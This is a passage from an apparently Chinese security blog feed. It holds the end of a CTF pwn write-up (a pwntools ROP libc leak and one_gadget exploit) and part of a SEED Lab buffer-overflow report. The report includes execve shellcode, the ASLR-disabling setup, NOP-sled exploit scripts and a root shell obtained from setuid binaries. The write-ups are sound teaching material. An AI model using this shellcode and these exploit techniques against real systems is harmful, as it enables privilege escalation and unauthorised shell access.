<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc= ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_puts_offset))</span><br></pre></td></tr></table></figure></li>
</ul>
<p><img src="/img/posts/2023-10-23-pwn5/images/puts_related_addr.png" alt="puts_related_addr"></p>
<ul>
<li>使用<code>one_gadget</code>工具获取到命令地址<code>exceve(&quot;/bin/sh&quot;)</code></li>
</ul>
<p><img src="/img/posts/2023-10-23-pwn5/images/one_gadget.png" alt="one_gadget"></p>
<ul>
<li>构造python脚本实现<code>&quot;/bin/sh&quot;</code>字符串的输入。</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn5&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me your payload\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数地址</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_puts_offset))</span><br><span class="line">libc_system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_system_offset))</span><br><span class="line">libc_one_gadget_offset = <span class="number">0x0f1247</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x400613</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x400587</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload泄漏puts函数地址</span></span><br><span class="line">payload1 = flat(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>), pop_rdi, puts_got, puts_plt, main_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line">puts_libc = p.recv(<span class="number">6</span>)</span><br><span class="line">puts_libc = u64(puts_libc.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(puts_libc))</span><br><span class="line"></span><br><span class="line">libc_base = puts_libc - libc_puts_offset</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">one_gadget = libc_base + libc_one_gadget_offset</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span> + <span class="number">8</span>) + p64(one_gadget)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Give me your payload\n&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x400585&#x27;)</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<ul>
<li>重要的函数地址以及偏移量：</li>
</ul>
<table>
<thead>
<tr>
<th>函数</th>
<th>地址</th>
</tr>
</thead>
<tbody><tr>
<td><code>main</code></td>
<td>0x0000000000400587</td>
</tr>
<tr>
<td><code>stack_overflow</code></td>
<td>0x0000000000400566</td>
</tr>
<tr>
<td><code>stack_overflow_leave</code></td>
<td>0x0000000000400585</td>
</tr>
<tr>
<td><code>pop_rdi</code></td>
<td>0x0000000000400613</td>
</tr>
<tr>
<td><code>one_gadget</code></td>
<td>0x0f1247</td>
</tr>
</tbody></table>
<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>成功执行命令：</p>
<p><img src="/img/posts/2023-10-23-pwn5/images/result.png" alt="image-20231001182756684"></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>PWN</tag>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>【SEED Lab2.0】缓冲区溢出实验报告</title>
    <url>/posts/637eab0b.html</url>
    <content><![CDATA[<h1 id="缓冲区溢出实验报告"><a href="#缓冲区溢出实验报告" class="headerlink" title="缓冲区溢出实验报告"></a>缓冲区溢出实验报告</h1><h2 id="stack-overflow-setuid"><a href="#stack-overflow-setuid" class="headerlink" title="stack_overflow(setuid)"></a>stack_overflow(setuid)</h2><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>配置环境，关闭ASLR地址随机化，将&#x2F;bin&#x2F;sh链接到&#x2F;bin&#x2F;zsh（&#x2F;bin&#x2F;dash以及&#x2F;bin&#x2F;bash都实现了一种安全对策， 防止自己在Set-UID进程中执行。 基本上，如果它们检测到它们是在一个Set-UID进程中执行的， 它们会立即将有效的用户ID更改为该进程的真实用户ID， 基本上会放弃特权  ）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">❯ sudo ln -sf /bin/zsh /bin/sh</span><br></pre></td></tr></table></figure>

<h3 id="Task1：-熟悉shellcode"><a href="#Task1：-熟悉shellcode" class="headerlink" title="Task1： 熟悉shellcode"></a>Task1： 熟悉shellcode</h3><p><code>shellcode C代码实现</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *name[<span class="number">2</span>];</span><br><span class="line">    name[<span class="number">0</span>] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">    name[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">    execve(name[<span class="number">0</span>], name, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>shellcode 二进制代码实现</code>:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* call_shellcode.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Binary code for setuid(0) </span></span><br><span class="line"><span class="comment">// 64-bit:  &quot;\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">// 32-bit:  &quot;\x31\xdb\x31\xc0\xb0\xd5\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> __x86_64__</span></span><br><span class="line">  <span class="string">&quot;\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e&quot;</span></span><br><span class="line">  <span class="string">&quot;\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57&quot;</span></span><br><span class="line">  <span class="string">&quot;\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="type">char</span> code[<span class="number">500</span>];</span><br><span class="line"></span><br><span class="line">   <span class="built_in">strcpy</span>(code, shellcode);</span><br><span class="line">   <span class="type">int</span> (*func)() = (<span class="type">int</span>(*)())code;</span><br><span class="line"></span><br><span class="line">   func();</span><br><span class="line">   <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将<code>call_shellcode.c</code>编译运行，可以发现会得到shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ make</span><br><span class="line">gcc -m32 -z execstack -o a32.out call_shellcode.c</span><br><span class="line">gcc -z execstack -o a64.out call_shellcode.c</span><br><span class="line">❯ ./a32.out</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span>                                                                           </span><br><span class="line">Makefile  a32.out  a64.out  call_shellcode.c</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">exit</span></span>                                                                         </span><br><span class="line">❯ ./a64.out</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">ls</span></span>                                                                           </span><br><span class="line">Makefile  a32.out  a64.out  call_shellcode.c</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">exit</span></span>                   </span><br></pre></td></tr></table></figure>

<h3 id="Task2：查看漏洞程序"><a href="#Task2：查看漏洞程序" class="headerlink" title="Task2：查看漏洞程序"></a>Task2：查看漏洞程序</h3><p><code>stack.c</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">/* Changing this size will change the layout of the stack.</span></span><br><span class="line"><span class="comment">* Instructors can change this value each year, so students</span></span><br><span class="line"><span class="comment">* won’t be able to use the solutions from the past. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> BUF_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">bof</span><span class="params">(<span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buffer[BUF_SIZE];</span><br><span class="line"><span class="comment">/* The following statement has a buffer overflow problem */</span></span><br><span class="line"><span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> str[<span class="number">517</span>];</span><br><span class="line">FILE *badfile;</span><br><span class="line">badfile = fopen(<span class="string">&quot;badfile&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fread(str, <span class="keyword">sizeof</span>(<span class="type">char</span>), <span class="number">517</span>, badfile);</span><br><span class="line">bof(str);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Returned Properly\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现该程序从badfile文件中读取517字节输入，然而BUF_SIZE的长度只有100，因此如果文件内容大于100会导致栈溢出。</p>
<p><strong>编译程序</strong>：将stack.c文件根据不同要求编译为四种不同保护强度的二进制可执行文件，并且修改其文件所有者为root，执行权限为setuid。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo sysctl -w kernel.randomize_va_space=0 </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">❯ sudo ln -sf /bin/zsh /bin/sh                                                           </span><br><span class="line">❯ make</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c</span><br><span class="line">gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c</span><br><span class="line">sudo chown root stack-L1 &amp;&amp; sudo chmod 4755 stack-L1</span><br><span class="line">[sudo] bronya 的密码： </span><br><span class="line">gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c</span><br><span class="line">gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c</span><br><span class="line">sudo chown root stack-L2 &amp;&amp; sudo chmod 4755 stack-L2</span><br><span class="line">gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -o stack-L3 stack.c</span><br><span class="line">gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -g -o stack-L3-dbg stack.c</span><br><span class="line">sudo chown root stack-L3 &amp;&amp; sudo chmod 4755 stack-L3</span><br><span class="line">gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -o stack-L4 stack.c</span><br><span class="line">gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -g -o stack-L4-dbg stack.c</span><br><span class="line">sudo chown root stack-L4 &amp;&amp; sudo chmod 4755 stack-L4</span><br></pre></td></tr></table></figure>

<h3 id="Task3：攻击32位程序"><a href="#Task3：攻击32位程序" class="headerlink" title="Task3：攻击32位程序"></a>Task3：攻击32位程序</h3><p><strong>gdb调试</strong>：新建badfile文件，使用gdb调试工具进行动态分析。在调试过程中在<code>bof</code>函数处设置断点，使程序运行到此，查看此时寄存器<code>ebp</code>和<code>buffer</code>的地址，由于需要溢出的输入需要从buffer开始一直覆盖到ebp寄存器，因此需要计算两地址的差值（0x6c）。因此可以通过此来构造payload进行栈溢出攻击，使ebp指向地址覆盖为shellcode。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ touch badfile</span><br><span class="line">❯ gdb ./stack-L1-dbg</span><br><span class="line">Breakpoint 1, bof (str=0xffffccc3 &quot;&quot;) at stack.c:20</span><br><span class="line">20	    strcpy(buffer, str);       </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line">*EAX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*EBX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*ECX  0x60</span><br><span class="line">*EDX  0xffffcca0 —▸ 0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L1-dbg&#x27;</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L1-dbg&#x27;</span><br><span class="line">*EBP  0xffffc898 —▸ 0xffffcca8 —▸ 0xffffced8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— ...</span><br><span class="line">*ESP  0xffffc820 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">*EIP  0x5655621e (bof+17) ◂— 0xff08ec83</span><br><span class="line">───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x5655621e &lt;bof+17&gt;    sub    esp, 8</span><br><span class="line">   0x56556221 &lt;bof+20&gt;    push   dword ptr [ebp + 8]</span><br><span class="line">   0x56556224 &lt;bof+23&gt;    lea    edx, [ebp - 0x6c]</span><br><span class="line">   0x56556227 &lt;bof+26&gt;    push   edx</span><br><span class="line">   0x56556228 &lt;bof+27&gt;    mov    ebx, eax</span><br><span class="line">   0x5655622a &lt;bof+29&gt;    call   strcpy@plt                    &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x5655622f &lt;bof+34&gt;    add    esp, 0x10</span><br><span class="line">   0x56556232 &lt;bof+37&gt;    mov    eax, 1</span><br><span class="line">   0x56556237 &lt;bof+42&gt;    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">   0x5655623a &lt;bof+45&gt;    leave  </span><br><span class="line">   0x5655623b &lt;bof+46&gt;    ret    </span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack.c</span><br><span class="line">   15 int bof(char *str)</span><br><span class="line">   16 &#123;</span><br><span class="line">   17     char buffer[BUF_SIZE];</span><br><span class="line">   18 </span><br><span class="line">   19     // The following statement has a buffer overflow problem </span><br><span class="line"> ► 20     strcpy(buffer, str);       </span><br><span class="line">   21 </span><br><span class="line">   22     return 1;</span><br><span class="line">   23 &#125;</span><br><span class="line">   24 </span><br><span class="line">   25 int main(int argc, char **argv)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffc820 —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">01:0004│     0xffffc824 —▸ 0x56557031 ◂— 0x3d3d3d00</span><br><span class="line">02:0008│     0xffffc828 —▸ 0xffffccb4 ◂— 0x0</span><br><span class="line">03:000c│     0xffffc82c ◂— 0x0</span><br><span class="line">... ↓        4 skipped</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x5655621e bof+17</span><br><span class="line">   1 0x56556342 dummy_function+58</span><br><span class="line">   2 0x565562da main+158</span><br><span class="line">   3 0xf7c21519 __libc_start_call_main+121</span><br><span class="line">   4 0xf7c215f3 __libc_start_main+147</span><br><span class="line">   5 0x5655610b _start+43</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p <span class="variable">$ebp</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffc898</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p &amp;buffer</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = (char (*)[100]) 0xffffc82c</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x 0xffffc898 - 0xffffc82c</span></span><br><span class="line">0x6c:	Cannot access memory at address 0x6c</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">q</span></span><br></pre></td></tr></table></figure>

<p><strong>构造python脚本</strong>：根据动态调试结果构造python脚本如下，python脚本对content（即payload）变量进行三次赋值，第一次赋值为长度为517字节全<code>\x90</code>，第二次将content末尾修改为shellcode，最后将rbp寄存器指向地址修改为程序原本返回的地址（防止程序在执行shellcode前因无法执行返回操作而崩溃）。注意gdb调试获取到的栈指针地址与实际运行会略有不同，因为gdb会将一些环境数据压入栈中，导致实际的栈指针变量会偏大，因此在构造payload时，ret的值并不是ebp，而是应该增大一些（&gt;&#x3D;96）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span class="line">start = <span class="number">517</span> - <span class="built_in">len</span>(shellcode)            <span class="comment"># Change this number </span></span><br><span class="line">content[start:start + <span class="built_in">len</span>(shellcode)] = shellcode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decide the return address value </span></span><br><span class="line"><span class="comment"># and put it somewhere in the payload</span></span><br><span class="line">ret    = <span class="number">0xffffcd98</span> + <span class="number">96</span>           <span class="comment"># Change this number </span></span><br><span class="line">offset = <span class="number">112</span>              <span class="comment"># Change this number </span></span><br><span class="line"></span><br><span class="line">L = <span class="number">4</span>     <span class="comment"># Use 4 for 32-bit address and 8 for 64-bit address</span></span><br><span class="line">content[offset:offset + L] = (ret).to_bytes(L,byteorder=<span class="string">&#x27;little&#x27;</span>) </span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write the content to a file</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;badfile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(content)</span><br></pre></td></tr></table></figure>

<p><strong>执行漏洞程序，获取到root权限shell</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ python3 exploit.py                                    </span><br><span class="line">❯ ./stack-L1</span><br><span class="line">Input size: 517</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">whoami</span></span>                                                                       </span><br><span class="line">root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span> </span><br></pre></td></tr></table></figure>

<h3 id="Task4：对未知buffer大小的程序进行攻击"><a href="#Task4：对未知buffer大小的程序进行攻击" class="headerlink" title="Task4：对未知buffer大小的程序进行攻击"></a>Task4：对未知buffer大小的程序进行攻击</h3><p>由于buffer大小未知，可以考虑喷射方法，将payload前若干项全部修改为要返回的地址，由于给定限定条件buffer大小位于100到200，所以可以考虑在前200+4项全部覆盖为ret_addr。这样总会将ebp地址覆盖为要返回的地址。</p>
<p>选择攻击stack-L2，首先进行gdb调试，获取ebp地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b bof</span></span><br><span class="line">Breakpoint 1 at 0x1221: file stack.c, line 20.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg </span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">Input size: 517</span><br><span class="line"></span><br><span class="line">Breakpoint 1, bof (str=0xffffccc3 &#x27;\220&#x27; &lt;repeats 112 times&gt;, &quot;\020\316\377\377&quot;, &#x27;\220&#x27; &lt;repeats 84 times&gt;...) at stack.c:20</span><br><span class="line">20	    strcpy(buffer, str);       </span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────</span><br><span class="line">*EAX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*EBX  0x56558fb8 (_GLOBAL_OFFSET_TABLE_) ◂— 0x3ec0</span><br><span class="line">*ECX  0x60</span><br><span class="line">*EDX  0xffffcca0 —▸ 0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg&#x27;</span><br><span class="line">*EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0</span><br><span class="line">*ESI  0xffffcfa4 —▸ 0xffffd18d ◂— &#x27;/home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack-L2-dbg&#x27;</span><br><span class="line">*EBP  0xffffc898 —▸ 0xffffcca8 —▸ 0xffffced8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— ...</span><br><span class="line">*ESP  0xffffc7f0 ◂— 0x205</span><br><span class="line">*EIP  0x56556221 (bof+20) ◂— 0xff08ec83</span><br><span class="line">───────────────────────[ DISASM / i386 / set emulate on ]───────────────────────</span><br><span class="line"> ► 0x56556221 &lt;bof+20&gt;    sub    esp, 8</span><br><span class="line">   0x56556224 &lt;bof+23&gt;    push   dword ptr [ebp + 8]</span><br><span class="line">   0x56556227 &lt;bof+26&gt;    lea    edx, [ebp - 0xa8]</span><br><span class="line">   0x5655622d &lt;bof+32&gt;    push   edx</span><br><span class="line">   0x5655622e &lt;bof+33&gt;    mov    ebx, eax</span><br><span class="line">   0x56556230 &lt;bof+35&gt;    call   strcpy@plt                    &lt;strcpy@plt&gt;</span><br><span class="line"> </span><br><span class="line">   0x56556235 &lt;bof+40&gt;    add    esp, 0x10</span><br><span class="line">   0x56556238 &lt;bof+43&gt;    mov    eax, 1</span><br><span class="line">   0x5655623d &lt;bof+48&gt;    mov    ebx, dword ptr [ebp - 4]</span><br><span class="line">   0x56556240 &lt;bof+51&gt;    leave  </span><br><span class="line">   0x56556241 &lt;bof+52&gt;    ret    </span><br><span class="line">───────────────────────────────[ SOURCE (CODE) ]────────────────────────────────</span><br><span class="line">In file: /home/bronya/Documents/SJTU/lab/buffer-overflow/setuid/Labsetup/code/stack.c</span><br><span class="line">   15 int bof(char *str)</span><br><span class="line">   16 &#123;</span><br><span class="line">   17     char buffer[BUF_SIZE];</span><br><span class="line">   18 </span><br><span class="line">   19     // The following statement has a buffer overflow problem </span><br><span class="line"> ► 20     strcpy(buffer, str);       </span><br><span class="line">   21 </span><br><span class="line">   22     return 1;</span><br><span class="line">   23 &#125;</span><br><span class="line">   24 </span><br><span class="line">   25 int main(int argc, char **argv)</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffc7f0 ◂— 0x205</span><br><span class="line">01:0004│     0xffffc7f4 ◂— 0x0</span><br><span class="line">02:0008│     0xffffc7f8 —▸ 0xffffc884 ◂— 0x0</span><br><span class="line">03:000c│     0xffffc7fc ◂— 0x0</span><br><span class="line">04:0010│     0xffffc800 —▸ 0xf7db68a0 (step0_jumps) ◂— 0x0</span><br><span class="line">05:0014│     0xffffc804 ◂— 0xffffffff</span><br><span class="line">06:0018│     0xffffc808 —▸ 0xf7c1aac9 ◂— &#x27;ld-linux.so.2&#x27;</span><br><span class="line">07:001c│     0xffffc80c —▸ 0xf7ffd608 (_rtld_global+1512) —▸ 0xf7fc6000 ◂— 0x464c457f</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x56556221 bof+20</span><br><span class="line">   1 0x56556348 dummy_function+58</span><br><span class="line">   2 0x565562e0 main+158</span><br><span class="line">   3 0xf7c21519 __libc_start_call_main+121</span><br><span class="line">   4 0xf7c215f3 __libc_start_main+147</span><br><span class="line">   5 0x5655610b _start+43</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p <span class="variable">$ebp</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = (void *) 0xffffc898</span></span><br></pre></td></tr></table></figure>

<p>利用此信息进行喷射攻击。构造python脚本如下</p>
<p><code>exploit.py</code>：将payload前208项全部覆盖为ret地址，ret地址需要大于等于$ebp+232。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Replace the content with the actual shellcode</span></span><br><span class="line">shellcode= (</span><br><span class="line">  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f&quot;</span></span><br><span class="line">  <span class="string">&quot;\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31&quot;</span></span><br><span class="line">  <span class="string">&quot;\xd2\x31\xc0\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill the content with NOP&#x27;s</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">517</span>)) </span><br><span class="line"></span><br><span class="line"><span class="comment">##################################################################</span></span><br><span class="line"><span class="comment"># Put the shellcode somewhere in the payload</span></span><br><span 